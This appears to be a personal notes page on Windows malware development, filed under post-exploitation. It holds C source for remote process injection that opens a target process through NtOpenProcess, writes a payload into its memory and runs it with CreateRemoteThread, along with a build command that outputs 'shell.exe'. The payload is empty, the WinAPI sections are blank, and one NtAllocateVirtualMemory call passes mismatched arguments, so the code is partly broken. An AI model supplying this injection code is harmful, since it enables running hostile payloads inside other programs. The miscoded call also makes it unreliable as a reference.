# Detect Processes

## WinAPI

### `OpenProcess`

> [!TIP]
> `PROCESS_ALL_ACCESS` isn't required. Only `PROCESS_CREATE_PROCESS` is efficient.

```

```

### `EnumProcesses`

```

```

## NtAPI

### `NtOpenProcess`

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#pragma comment(lib, "ntdll")

/*
https://cocomelonc.github.io/tutorial/2021/12/11/malware-injection-11.html
https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntopenprocess

$ x86_64-w64-mingw32-g++ ntopenprocess.c -o shell.exe -mconsole \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ -static-libgcc \
-fpermissive
*/

#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
    (p)->RootDirectory = (r); \
    (p)->Attributes = (a); \
    (p)->ObjectName = (n); \
    (p)->SecurityDescriptor = (s); \
    (p)->SecurityQualityOfService = NULL; \
}

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory) (
    HANDLE  ProcessHandle,
    PVOID   *BaseAddress,
    ULONG   ZeroBits,
    PULONG  RegionSize,
    ULONG   AllocationType,
    ULONG   Protect
);

// dt nt!_UNICODE_STRING
typedef struct _UNICODE_STRING {
    USHORT  Length;
    USHORT  MaximumLength;
    PWSTR   Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

// dt nt!_OBJECT_ATTRIBUTES
typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

// dt nt!_CLIENT_ID
typedef struct _CLIENT_ID {
    PVOID   UniqueProcess;
    PVOID   UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef NTSTATUS(NTAPI *pNtOpenProcess)(
    PHANDLE             ProcessHandle,
    ACCESS_MASK         AccessMask,
    POBJECT_ATTRIBUTES  ObjectAttributes,
    PCLIENT_ID          ClientID
);

unsigned char payload[] = "";

unsigned int size = (int) sizeof(payload);

int main(int argc, char *argv[]) {
    HANDLE process_handle; // process handle
    HANDLE remote_thread; // remote thread
    PVOID remote_buffer; // remote buffer
    DWORD process_id; // process ID

    process_id = atoi(argv[1]);
    OBJECT_ATTRIBUTES object_attributes;

    CLIENT_ID client_id;

    InitializeObjectAttributes(&object_attributes, NULL, 0, NULL, NULL);
    client_id.UniqueProcess = (PVOID) process_id;
    client_id.UniqueThread = 0;

    // Loading ntdll.dll
    HMODULE ntdll = GetModuleHandleA("ntdll");
    printf("process_id: %i", process_id);

    pNtOpenProcess NtOpenProcess = (pNtOpenProcess)GetProcAddress(ntdll, "NtOpenProcess");
    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");

    // Open remote process via NT API
    NtOpenProcess(&process_handle, PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, &object_attributes, &client_id);

    if(!process_handle) {
        printf("Failed to open process :(\n");
        return -2;
    }

    // Allocate memory buffer for remote process
    NtAllocateVirtualMemory(process_handle, remote_buffer, payload, size, NULL);

    // "Copy" data between processes
    WriteProcessMemory(process_handle, remote_buffer, payload, size, NULL);

    // Our process start new thread
    remote_thread = CreateRemoteThread(process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)remote_buffer, NULL, 0, NULL);
    CloseHandle(process_handle);
    return 0;
}
```

---
## References

- [[06 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x00 - Discovery/Desktop/Windows/Host/0xA - Internal Reconnaissance/Processes/Malware Development/Enumerate Process Identifiers]]